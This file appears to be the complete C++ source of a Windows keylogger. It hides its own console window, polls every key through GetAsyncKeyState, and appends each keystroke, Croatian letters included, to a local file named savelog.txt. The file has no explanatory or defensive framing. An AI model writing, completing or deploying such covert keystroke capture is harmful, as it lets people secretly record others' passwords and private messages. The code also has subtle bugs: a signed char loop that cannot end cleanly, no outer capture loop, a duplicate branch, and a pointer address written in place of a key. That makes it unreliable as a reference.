#include<iostream>
#include<Windows.h>
#include<string>
#include<fstream>
using namespace std;
class base_class {
public:
	int save_keys(int key);
};
class derived_class :public base_class {
public:
	derived_class();
	void hide();
};

int base_class::save_keys(int key) {
	ofstream obj;
	obj.open("savelog.txt", ios::app | ios::out);
	if (obj.is_open()) {
		cout << " ";
	}
	if (key == VK_SHIFT) {
		obj << "[SHIFT]";
	}
	else if (key == VK_BACK) {
		obj << "[BACK_Space]";
	}
	else if (key == VK_TAB) {
		obj << "[TAB]";
	}
	else if (key == VK_INSERT) {
		obj << " [insert] ";
	}
	else if (key == VK_RETURN) {
		obj << "[ENTER]";
	}
	else if (key == VK_MENU) {
		obj << "[Alt]";
	}
	else if (key == VK_PAUSE) {
		obj << "[PAUSE]";
	}
	else if (key == VK_CAPITAL) {
		obj << "[CAPS_LOCK]";
	}
	else if (key == VK_SPACE) {
		obj << " ";
	}
	else if (key == VK_NEXT) {
		obj << "[PAGE DOWN key]";
	}
	else if (key == VK_PRIOR) {
		obj << "[PAGE UP key]";
	}
	else if (key == VK_END) {
		obj << "[END key]";
	}
	else if (key == VK_DELETE) {
		obj << "[Delete]";
	}
	else if (key == VK_CONTROL) {
		obj << "[CTRL key]";
	}
	else if (key == VK_HOME) {
		obj << "[HOME key]";
	}
	else if (key == VK_LEFT) {
		obj << "[LEFT ARROW key]";
	}
	else if (key == VK_RIGHT) {
		obj << "[RIGHT ARROW key]";
	}
	else if (key == VK_UP) {
		obj << "[UP ARROW key]";
	}
	else if (key == VK_DOWN) {
		obj << "[DOWN ARROW key]";
	}
	else if (key == VK_PRINT) {
		obj << "[PRINT ARROW key]";
	}
	else if (key == VK_SLEEP) {
		obj << "[Sleep key]";
	}
	else if (key == VK_ADD) {
		obj << "[+]";
	}
	else if (key == VK_MULTIPLY) {
		obj << "[*]";
	}
	else if (key == VK_OEM_MINUS || key == VK_SUBTRACT)
	{
		obj << " [-] ";
	}
	else if (key == VK_DIVIDE) {
		obj << "[/]";
	}
	else if (key == VK_LBUTTON) {
		obj << "[Mouse left button]";
	}
	else if (key == VK_RBUTTON) {
		obj << "[Mouse Right button]";
	}
	else if (key == VK_F1) {
		obj << "[F1]";
	}
	else if (key == VK_F2) {
		obj << "[F2]";
	}
	else if (key == VK_F3) {
		obj << "[F3]";
	}
	else if (key == VK_F4) {
		obj << "[F4]";
	}
	else if (key == VK_F5) {
		obj << "[F5]";
	}
	else if (key == VK_F6) {
		obj << "[F6]";
	}
	else if (key == VK_F7) {
		obj << "[F7]";
	}
	else if (key == VK_F8) {
		obj << "[F8]";
	}
	else if (key == VK_F9) {
		obj << "[F9]";
	}
	else if (key == VK_F10) {
		obj << "[F10]";
	}
	else if (key == VK_F11) {
		obj << "[F11]";
	}
	else if (key == VK_F12) {
		obj << "[F12]";
	}
	else if (key == VK_ESCAPE) {
		obj << "[Esc]";
	}
	else if (key == VK_SNAPSHOT) {
		obj << "[Print Screen]";
	}
	else if (key == VK_OEM_3) {
		obj << "[ ~ ` ]";
	}
	else if (key == VK_OEM_4) {
		obj << "[ { [ ]";
	}
	else if (key == VK_OEM_6) {
		obj << "[  } ]  ]";
	}
	else if (key == VK_OEM_1) {
		obj << "[  : ;  ]";
	}
	else if (key == VK_OEM_7) {
		obj << "[  \" '  ]";
	}
	else if (key == VK_OEM_7) {
		obj << "[  \" '  ]";
	}
	else if (key == VK_OEM_PERIOD || key == VK_DECIMAL)
	{
		obj << ".";
	}
	else if (!GetAsyncKeyState(VK_SHIFT))
	{
		switch (key)
		{
		case 0x41:
			obj << "a";
			break;
		case 0x42:
			obj << "b";
			break;
		case 0x43:
			obj << "c";
			break;
		case 0xBA:
			obj << "č";
			break;
		case 0x44:
			obj << "d";
			break;
		case 0x45:
			obj << "e";
			break;
		case 0x46:
			obj << "f";
			break;
		case 0x47:
			obj << "g";
			break;
		case 0x48:
			obj << "h";
			break;
		case 0x49:
			obj << "i";
			break;
		case 0x4A:
			obj << "j";
			break;
		case 0x4B:
			obj << "k";
			break;
		case 0x4C:
			obj << "l";
			break;
		case 0x4D:
			obj << "m";
			break;
		case 0x4E:
			obj << "n";
			break;
		case 0x4F:
			obj << "o";
			break;
		case 0x50:
			obj << "p";
			break;
		case 0x52:
			obj << "r";
			break;
		case 0x53:
			obj << "s";
			break;
		case 0x54:
			obj << "t";
			break;
		case 0x55:
			obj << "u";
			break;
		case 0x56:
			obj << "v";
			break;
		case 0x5A:
			obj << "z";
			break;
		case 0xDC:
			obj << "\\";
			break;
		case 0x51:
			obj << "q";
			break;
		case 0x57:
			obj << "w";
			break;
		case 0x59:
			obj << "y";
			break;
		case 0x58:
			obj << "x";
			break;
		case 0xDE:
			obj << "ć";
			break;
		case 0xDD:
			obj << "đ";
			break;
		default:
			obj << " ";
		}
	}
	else if (GetAsyncKeyState(VK_LSHIFT))
	{
		switch (key)
		{
		case 0x51:
			obj << "[\\]";
			break;
		case 0x57:
			obj << "[|]";
			break;
		case 0xDB:
			obj << "[{]";
			break;
		case 0xDD:
			obj << "[}]";
			break;
		case 0xDC:
			obj << "[|]";
			break;
		case 0x56:
			obj << "[@]";
			break;
		case 0xBE:
			obj << "[>]";
			break;
		}
	}
	else if (GetAsyncKeyState(VK_SHIFT))
	{
		switch (key)
		{
		case 0x41:
			obj << "A";
			break;
		case 0x42:
			obj << "B";
			break;
		case 0x43:
			obj << "C";
			break;
		case 0xBA:
			obj << "č";
			break;
		case 0x44:
			obj << "D";
			break;
		case 0x45:
			obj << "E";
			break;
		case 0x46:
			obj << "F";
			break;
		case 0x47:
			obj << "G";
			break;
		case 0x48:
			obj << "H";
			break;
		case 0x49:
			obj << "I";
			break;
		case 0x4A:
			obj << "J";
			break;
		case 0x4B:
			obj << "K";
			break;
		case 0x4C:
			obj << "L";
			break;
		case 0x4D:
			obj << "M";
			break;
		case 0x4E:
			obj << "N";
			break;
		case 0x4F:
			obj << "O";
			break;
		case 0x50:
			obj << "P";
			break;
		case 0x52:
			obj << "R";
			break;
		case 0x53:
			obj << "S";
			break;
		case 0x54:
			obj << "T";
			break;
		case 0x55:
			obj << "U";
			break;
		case 0x56:
			obj << "V";
			break;
		case 0x5A:
			obj << "Z";
			break;
		case 0x51:
			obj << "Q";
			break;
		case 0x57:
			obj << "W";
			break;
		case 0x59:
			obj << "Y";
			break;
		case 0x58:
			obj << "X";
			break;
		default:
			switch (key)
			{
			case 0x30:
				obj << "0";
				break;
			case 0x31:
				obj << "1";
				break;
			case 0x32:
				obj << "2";
				break;
			case 0x33:
				obj << "3";
				break;
			case 0x34:
				obj << "4";
				break;
			case 0x35:
				obj << "5";
				break;
			case 0x36:
				obj << "6";
				break;
			case 0x37:
				obj << "7";
				break;
			case 0x38:
				obj << "8";
				break;
			case 0x39:
				obj << "9";
				break;
			case 0xBF:
				obj << "/";
				break;
			case 0xBB:
				obj << "=";
				break;
			case 0xBC:
				obj << ",";
				break;
			case 0xBE:
				obj << ".";
				break;
			case 0xBD:
				obj << "-";
				break;
			case 0xE2:
				obj << "<";
				break;
			}
		}
	}
	else {
		obj << &key;
	}
	obj.close();
	return 0;
}
derived_class::derived_class() {
	hide();
}


void derived_class::hide() {
			
	ShowWindow(GetConsoleWindow(), SW_HIDE);
		
}

int main() {
	derived_class d;
	 char ch;
	bool check;

	for ( ch = 0; ch <= 255; ch++) {
		
		if (GetAsyncKeyState(ch) == -32767)
		{
			check = true;
		}
		else
		{
			check = false;
		}
		if (check == true) {

			d.save_keys(ch);
		}
	}
	return 0;
}
